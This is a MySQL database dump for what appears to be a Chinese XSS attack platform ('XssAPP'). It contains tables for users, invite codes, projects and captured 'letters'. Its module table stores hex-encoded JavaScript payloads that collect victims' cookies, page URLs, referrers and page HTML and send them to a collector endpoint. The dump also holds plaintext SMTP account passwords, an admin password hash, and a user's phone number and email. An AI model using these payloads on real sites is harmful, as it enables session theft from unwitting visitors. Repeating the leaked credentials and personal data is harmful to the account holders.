/*
Navicat MySQL Data Transfer

Source Server         : blog
Source Server Version : 50173
Source Host           : 127.0.0.1:3366
Source Database       : xss

Target Server Type    : MYSQL
Target Server Version : 50173
File Encoding         : 65001

Date: 2017-04-05 10:42:40
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `user_pwd` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `role_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `admin_role_id_fk` (`role_id`),
  CONSTRAINT `admin_role_id_fk` FOREIGN KEY (`role_id`) REFERENCES `role` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES ('2', 'admin', '6addc798f225c53ea1f3ef1884a21ff7', '1');

-- ----------------------------
-- Table structure for email
-- ----------------------------
DROP TABLE IF EXISTS `email`;
CREATE TABLE `email` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `smtp` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `password` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `activite` int(1) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of email
-- ----------------------------
INSERT INTO `email` VALUES ('3', 'smtp.aliyun.com', 'xssapp@aliyun.com', 'websafe0day', '1');
INSERT INTO `email` VALUES ('4', 'smtp.tom.com', 'xssapp@tom.com', 'websafe0day', '1');
INSERT INTO `email` VALUES ('5', 'smtp.sohu.com', 'xssapp@sohu.com', 'websafe0day', '1');
INSERT INTO `email` VALUES ('6', 'smtp.tom.com', 'webxss@tom.com', 'websafe0day', '1');
INSERT INTO `email` VALUES ('7', 'smtp.aliyun.com', 'appxss@aliyun.com', 'websafe0day', '1');

-- ----------------------------
-- Table structure for invite
-- ----------------------------
DROP TABLE IF EXISTS `invite`;
CREATE TABLE `invite` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `invite_code` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `status` int(1) DEFAULT '0',
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `invite_user_id_fk` (`user_id`),
  KEY `invite_code_index` (`invite_code`),
  CONSTRAINT `invite_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=141 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of invite
-- ----------------------------
INSERT INTO `invite` VALUES ('131', 'fd6f71e66ea64a5992f978ab7d928a18', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('132', '35e0912823ff41d09bbccb7c3d9f318a', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('133', 'd7d4423223cf4fecbebca9d5952be676', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('134', 'c46c48681ed149d6817a2f315434af6d', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('135', '8ba7172fc0774561b7b035a65d4402a1', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('136', '0907359c36bd418b85ce25c9350ae4fc', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('137', 'cc22eba69c7c41e8a9ef99a75b86a06e', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('138', '3d0de2a12ef943edbbb43282ae154088', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('139', '5aa5b8840399465191a52212d24b84e9', null, '1', '2017-03-29 20:37:17');
INSERT INTO `invite` VALUES ('140', 'ea4d6c8a551646e685f333553d2f79b0', '471', '0', '2017-03-29 20:37:24');

-- ----------------------------
-- Table structure for letter
-- ----------------------------
DROP TABLE IF EXISTS `letter`;
CREATE TABLE `letter` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `project_id` int(11) DEFAULT NULL,
  `ref_url` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  `uuid` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `context` longtext COLLATE utf8_bin,
  `ip` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `ip_info` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `letter_project_id_fk` (`project_id`) USING BTREE,
  KEY `letter_uuid_index` (`uuid`),
  CONSTRAINT `paras_project_id_fk` FOREIGN KEY (`project_id`) REFERENCES `project` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter
-- ----------------------------

-- ----------------------------
-- Table structure for letter_paras
-- ----------------------------
DROP TABLE IF EXISTS `letter_paras`;
CREATE TABLE `letter_paras` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `para_name` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `letter_id` int(11) DEFAULT NULL,
  `para_value` text COLLATE utf8_bin,
  `update_time` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `paras_letter_id` (`letter_id`),
  CONSTRAINT `paras_letter_id` FOREIGN KEY (`letter_id`) REFERENCES `letter` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of letter_paras
-- ----------------------------

-- ----------------------------
-- Table structure for menus
-- ----------------------------
DROP TABLE IF EXISTS `menus`;
CREATE TABLE `menus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(64) DEFAULT NULL,
  `url` varchar(255) DEFAULT NULL,
  `type` int(1) DEFAULT '0',
  `up_id` int(11) DEFAULT NULL,
  `seq` int(11) DEFAULT NULL,
  `code` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `menu_up_id_fk` (`up_id`),
  CONSTRAINT `menu_up_id_fk` FOREIGN KEY (`up_id`) REFERENCES `menus` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of menus
-- ----------------------------
INSERT INTO `menus` VALUES ('1', '后台首页', 'admin/base', '1', '2', '0', 'backIndex');
INSERT INTO `menus` VALUES ('2', '系统管理', '#', '0', null, '1', '');
INSERT INTO `menus` VALUES ('3', '基本设置', 'admin/setting', '1', '2', '2', 'baseSetting');
INSERT INTO `menus` VALUES ('4', '用户管理', 'admin/sysUserAdmin', '1', '18', '2', 'adminSetting');
INSERT INTO `menus` VALUES ('5', '角色管理', 'admin/roleList', '1', '18', '3', 'roleSetting');
INSERT INTO `menus` VALUES ('6', '后缀设置', 'admin/adminSuffix', '1', '2', '3', 'suffixSetting');
INSERT INTO `menus` VALUES ('9', '内容管理', '#', '0', null, '2', null);
INSERT INTO `menus` VALUES ('10', '项目管理', 'admin/projectList', '1', '9', '1', 'projectSetting');
INSERT INTO `menus` VALUES ('11', '模块管理', 'admin/moduleList', '1', '9', '2', 'moduleSetting');
INSERT INTO `menus` VALUES ('12', '信封管理', 'admin/letterList', '1', '9', '3', 'letterSetting');
INSERT INTO `menus` VALUES ('13', '用户管理', '#', '0', null, '2', null);
INSERT INTO `menus` VALUES ('14', '用户列表', 'admin/userList', '1', '13', '0', 'userSetting');
INSERT INTO `menus` VALUES ('15', '邀请码管理', 'admin/inviteList', '1', '13', '1', 'inviteSetting');
INSERT INTO `menus` VALUES ('17', '邮箱管理', 'admin/sysEmailAdmin', '1', '2', '6', 'emailSetting');
INSERT INTO `menus` VALUES ('18', '权限管理', '#', '0', null, '3', null);
INSERT INTO `menus` VALUES ('19', '调试中心', '#', '0', null, '4', null);
INSERT INTO `menus` VALUES ('20', '资源管理', 'admin/server', '1', '19', '0', 'server');
INSERT INTO `menus` VALUES ('21', '服务监听', 'admin/serverMonitor', '1', '19', '1', 'server');
INSERT INTO `menus` VALUES ('22', '缓存管理', 'admin/cache', '1', '19', '2', 'cache');

-- ----------------------------
-- Table structure for module
-- ----------------------------
DROP TABLE IF EXISTS `module`;
CREATE TABLE `module` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `content` text COLLATE utf8_bin,
  `type` int(11) DEFAULT '0',
  `update_time` datetime DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `module_id_index` (`id`),
  KEY `module_type_index` (`type`),
  KEY `module_all_index` (`user_id`,`type`),
  CONSTRAINT `module_user_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of module
-- ----------------------------
INSERT INTO `module` VALUES ('1', null, 'ajax钓鱼模块,适用于windows', 0x416A6178203D2066756E6374696F6E2829207B2066756E6374696F6E2072657175657374286F707429207B2066756E6374696F6E20666E2829207B207D207661722075726C203D206F70742E75726C207C7C2022223B20766172206173796E63203D206F70742E6173796E6320213D3D2066616C73652C206D6574686F64203D206F70742E6D6574686F64207C7C2027474554272C2064617461203D206F70742E64617461207C7C206E756C6C2C2073756363657373203D206F70742E73756363657373207C7C20666E2C206572726F72203D206F70742E6661696C757265207C7C20666E3B206D6574686F64203D206D6574686F642E746F55707065724361736528293B20696620286D6574686F64203D3D202747455427202626206461746129207B207661722061726773203D2022223B2069662028747970656F662064617461203D3D2027737472696E672729207B2061726773203D20646174613B207D20656C73652069662028747970656F662064617461203D3D20276F626A6563742729207B2076617220617272203D206E657720417272617928293B20666F72202820766172206B20696E206461746129207B207661722076203D20646174615B6B5D3B206172722E70757368286B202B20223D22202B2076293B207D2061726773203D206172722E6A6F696E28222622293B207D2075726C202B3D202875726C2E696E6465784F6628273F2729203D3D202D31203F20273F27203A2027262729202B20617267733B2064617461203D206E756C6C3B207D2076617220786872203D2077696E646F772E584D4C4874747052657175657374203F206E657720584D4C48747470526571756573742829203A206E657720416374697665584F626A65637428274D6963726F736F66742E584D4C4854545027293B207868722E6F6E726561647973746174656368616E6765203D2066756E6374696F6E2829207B205F6F6E53746174654368616E6765287868722C20737563636573732C206572726F72293B207D3B207868722E6F70656E286D6574686F642C2075726C2C206173796E63293B20696620286D6574686F64203D3D2027504F53542729207B207868722E736574526571756573744865616465722827436F6E74656E742D74797065272C20276170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F6465643B27293B207D207868722E73656E642864617461293B2072657475726E207868723B207D2066756E6374696F6E205F6F6E53746174654368616E6765287868722C20737563636573732C206661696C75726529207B20696620287868722E72656164795374617465203D3D203429207B207661722073203D207868722E7374617475733B206966202873203E3D203230302026262073203C2033303029207B207375636365737328786872293B207D20656C7365207B206661696C75726528786872293B207D207D20656C7365207B207D207D2072657475726E207B2072657175657374203A2072657175657374207D3B207D28293B20636F6D6D697428293B2066756E6374696F6E20636F6D6D69742829207B2076617220636F6F6B6965203D20646F63756D656E742E636F6F6B69653B207661722075726C203D20646F63756D656E742E6C6F636174696F6E3B207661722068746D6C3D20646F63756D656E742E676574456C656D656E747342795461674E616D65282768746D6C27295B305D2E696E6E657248544D4C3B20636F6F6B6965203D20656E636F6465555249436F6D706F6E656E7428636F6F6B6965293B2075726C203D20656E636F6465555249436F6D706F6E656E742875726C293B2068746D6C3D656E636F6465555249436F6D706F6E656E742868746D6C293B20416A61782E72657175657374287B2075726C203A20227B6170697D222C2064617461203A202775726C3D27202B2075726C202B202726636F6F6B69653D27202B20636F6F6B69652C206D6574686F64203A2022504F5354222C2073756363657373203A2066756E6374696F6E2878687229207B207D2C206572726F72203A2066756E6374696F6E2878687229207B207D207D293B207D, '0', '2015-12-05 14:13:06', 'Ajax');
INSERT INTO `module` VALUES ('2', null, 'ajax钓鱼模块,适用于windows', 0x7661722078203D206E657720496D61676528293B0D0A747279207B0D0A09766172206D796F70656E6572203D2027273B0D0A096D796F70656E6572203D2077696E646F772E6F70656E65722026262077696E646F772E6F70656E65722E6C6F636174696F6E203F2077696E646F772E6F70656E65722E6C6F636174696F6E0D0A0909093A2027273B0D0A7D206361746368202865727229207B0D0A7D0D0A782E737263203D20277B6170697D3F6C6F636174696F6E3D270D0A09092B2065736361706528646F63756D656E742E6C6F636174696F6E29202B202726746F706C6F636174696F6E3D270D0A09092B2065736361706528746F702E646F63756D656E742E6C6F636174696F6E29202B202726636F6F6B69653D27202B2065736361706528646F63756D656E742E636F6F6B6965290D0A09092B2027266F70656E65723D27202B20657363617065286D796F70656E657229202B20272672656665727265723D270D0A09092B2065736361706528646F63756D656E742E7265666572726572293B, '0', '2015-12-05 14:13:06', '获取Cookie');

-- ----------------------------
-- Table structure for project
-- ----------------------------
DROP TABLE IF EXISTS `project`;
CREATE TABLE `project` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `module_id` int(11) DEFAULT NULL,
  `user_id` int(11) DEFAULT NULL,
  `title` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `remark` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `update_time` datetime DEFAULT NULL,
  `uuid` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `uri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `sort_uri` varchar(255) COLLATE utf8_bin DEFAULT NULL,
  `open_mobile` int(1) DEFAULT '0',
  `open_email` int(1) DEFAULT '0',
  `filter` varchar(2048) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `project_module_id_fk` (`module_id`),
  KEY `project_user_id_fk` (`user_id`),
  CONSTRAINT `project_module_id_fk` FOREIGN KEY (`module_id`) REFERENCES `module` (`id`),
  CONSTRAINT `project_user_id_fk` FOREIGN KEY (`user_id`) REFERENCES `user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=190 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of project
-- ----------------------------
INSERT INTO `project` VALUES ('189', '2', '471', '0328项目', null, '2017-03-29 21:46:49', '8d3d3df93a1543c293ca940aa8abee49', 'http://xss.54sb.org/s/189.asp', 'http://t.cn/R69bvgw', null, '1', null);

-- ----------------------------
-- Table structure for role
-- ----------------------------
DROP TABLE IF EXISTS `role`;
CREATE TABLE `role` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(64) COLLATE utf8_bin DEFAULT NULL,
  `menus` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of role
-- ----------------------------
INSERT INTO `role` VALUES ('1', '超级管理员', '1,2,8,6,17,3,9,10,12,11,13,16,15,14,18,4,7,5,19,20,21,22');

-- ----------------------------
-- Table structure for setting
-- ----------------------------
DROP TABLE IF EXISTS `setting`;
CREATE TABLE `setting` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `site_name` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `keywords` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `description` varchar(1024) COLLATE utf8_bin DEFAULT NULL,
  `copyright` varchar(128) COLLATE utf8_bin DEFAULT NULL,
  `open_reg` int(1) DEFAULT '0' COMMENT '是否开启注册',
  `open_invite` int(1) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of setting
-- ----------------------------
INSERT INTO `setting` VALUES ('1', 'XssAPP演示站点', 'XssAPP演示站点', 'XSS测试平台是一个针对跨站脚本攻击或CSRF攻击漏洞为基础的测试平台，具备专业的XSS认证基础。', 'Copyright © 2014-2019 WebSos Group 版权所有 All Rights Reserved', '0', '0');

-- ----------------------------
-- Table structure for suffix
-- ----------------------------
DROP TABLE IF EXISTS `suffix`;
CREATE TABLE `suffix` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  `status` int(1) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=56 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix
-- ----------------------------
INSERT INTO `suffix` VALUES ('1', 'do', '1');
INSERT INTO `suffix` VALUES ('2', 'asp', '2');
INSERT INTO `suffix` VALUES ('3', 'php', '1');
INSERT INTO `suffix` VALUES ('4', 'aspx', '1');
INSERT INTO `suffix` VALUES ('5', 'jspx', '1');
INSERT INTO `suffix` VALUES ('6', 'phpx', '1');
INSERT INTO `suffix` VALUES ('7', 'cer', '1');
INSERT INTO `suffix` VALUES ('8', 'txt', '1');
INSERT INTO `suffix` VALUES ('9', 'ashx', '1');
INSERT INTO `suffix` VALUES ('10', 'ascx', '1');
INSERT INTO `suffix` VALUES ('11', 'ser', '1');
INSERT INTO `suffix` VALUES ('12', 'cgi', '1');
INSERT INTO `suffix` VALUES ('13', 'xml', '1');
INSERT INTO `suffix` VALUES ('14', 'html', '1');
INSERT INTO `suffix` VALUES ('15', 'htm', '1');
INSERT INTO `suffix` VALUES ('16', 'sb', '1');
INSERT INTO `suffix` VALUES ('17', 'jshx', '1');
INSERT INTO `suffix` VALUES ('18', 'gov', '1');
INSERT INTO `suffix` VALUES ('19', 'edu', '1');
INSERT INTO `suffix` VALUES ('20', 'sos', '1');
INSERT INTO `suffix` VALUES ('21', 'asa', '1');
INSERT INTO `suffix` VALUES ('22', 'asax', '1');
INSERT INTO `suffix` VALUES ('23', 'shtml', '1');
INSERT INTO `suffix` VALUES ('24', 'iis', '1');
INSERT INTO `suffix` VALUES ('25', 'swf', '1');
INSERT INTO `suffix` VALUES ('26', 'exp', '1');
INSERT INTO `suffix` VALUES ('27', 'esp', '1');
INSERT INTO `suffix` VALUES ('28', 'csp', '1');
INSERT INTO `suffix` VALUES ('29', 'psp', '1');
INSERT INTO `suffix` VALUES ('30', 'fsp', '1');
INSERT INTO `suffix` VALUES ('31', 'xsp', '1');
INSERT INTO `suffix` VALUES ('32', 'action', '1');
INSERT INTO `suffix` VALUES ('33', 'ftl', '1');
INSERT INTO `suffix` VALUES ('34', 'cmd', '1');
INSERT INTO `suffix` VALUES ('35', 'bat', '1');
INSERT INTO `suffix` VALUES ('36', 'vbs', '1');
INSERT INTO `suffix` VALUES ('37', 'vbe', '1');
INSERT INTO `suffix` VALUES ('38', 'com', '1');
INSERT INTO `suffix` VALUES ('39', 'xhtml', '1');
INSERT INTO `suffix` VALUES ('40', 'jhtml', '1');
INSERT INTO `suffix` VALUES ('41', 'tmp', '1');
INSERT INTO `suffix` VALUES ('42', 'cssx', '1');
INSERT INTO `suffix` VALUES ('43', 'jsx', '1');
INSERT INTO `suffix` VALUES ('44', 'exe', '1');
INSERT INTO `suffix` VALUES ('45', 'mspx', '1');
INSERT INTO `suffix` VALUES ('46', 'exec', '1');
INSERT INTO `suffix` VALUES ('47', 'org', '1');
INSERT INTO `suffix` VALUES ('48', 'jpgx', '1');
INSERT INTO `suffix` VALUES ('49', 'gifx', '1');
INSERT INTO `suffix` VALUES ('50', 'pngx', '1');
INSERT INTO `suffix` VALUES ('51', 'py', '1');
INSERT INTO `suffix` VALUES ('52', 'cgix', '1');
INSERT INTO `suffix` VALUES ('53', 'shell', '1');
INSERT INTO `suffix` VALUES ('54', 'csrf', '1');
INSERT INTO `suffix` VALUES ('55', 'xss', '1');

-- ----------------------------
-- Table structure for suffix_static
-- ----------------------------
DROP TABLE IF EXISTS `suffix_static`;
CREATE TABLE `suffix_static` (
  `id` int(8) NOT NULL AUTO_INCREMENT,
  `suffix` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=26 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of suffix_static
-- ----------------------------
INSERT INTO `suffix_static` VALUES ('1', 'css');
INSERT INTO `suffix_static` VALUES ('2', 'js');
INSERT INTO `suffix_static` VALUES ('3', 'jpg');
INSERT INTO `suffix_static` VALUES ('4', 'gif');
INSERT INTO `suffix_static` VALUES ('5', 'bmp');
INSERT INTO `suffix_static` VALUES ('6', 'ico');
INSERT INTO `suffix_static` VALUES ('8', 'exe');
INSERT INTO `suffix_static` VALUES ('9', 'zip');
INSERT INTO `suffix_static` VALUES ('10', 'rar');
INSERT INTO `suffix_static` VALUES ('11', '7z');
INSERT INTO `suffix_static` VALUES ('12', 'jpeg');
INSERT INTO `suffix_static` VALUES ('13', 'png');
INSERT INTO `suffix_static` VALUES ('14', 'doc');
INSERT INTO `suffix_static` VALUES ('15', 'ppt');
INSERT INTO `suffix_static` VALUES ('16', 'avi');
INSERT INTO `suffix_static` VALUES ('17', 'mp4');
INSERT INTO `suffix_static` VALUES ('18', 'rmvb');
INSERT INTO `suffix_static` VALUES ('19', 'flv');
INSERT INTO `suffix_static` VALUES ('20', 'woff');
INSERT INTO `suffix_static` VALUES ('21', 'woff2');
INSERT INTO `suffix_static` VALUES ('22', 'eot');
INSERT INTO `suffix_static` VALUES ('23', 'svg');
INSERT INTO `suffix_static` VALUES ('24', 'ttf');
INSERT INTO `suffix_static` VALUES ('25', 'otf');

-- ----------------------------
-- Table structure for user
-- ----------------------------
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_name` varchar(24) COLLATE utf8_bin DEFAULT NULL,
  `user_pwd` varchar(40) COLLATE utf8_bin DEFAULT NULL,
  `mobile` varchar(20) COLLATE utf8_bin DEFAULT NULL,
  `email` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  `create_time` datetime DEFAULT NULL,
  `uuid` varchar(32) COLLATE utf8_bin DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_name_index` (`user_name`) USING HASH,
  KEY `user_pwd_index` (`user_pwd`) USING HASH,
  KEY `user_email_index` (`email`) USING BTREE,
  KEY `user_mobile_index` (`mobile`) USING BTREE,
  KEY `user_uuid_index` (`uuid`)
) ENGINE=InnoDB AUTO_INCREMENT=472 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;

-- ----------------------------
-- Records of user
-- ----------------------------
INSERT INTO `user` VALUES ('471', 'websos', '5adbad0cd999d0f467c1ccf3ae0f531a', '13226635321', '644556636@qq.com', '2017-03-29 20:37:24', 'fb6a0404aeed48d49dc20d354e62b454');
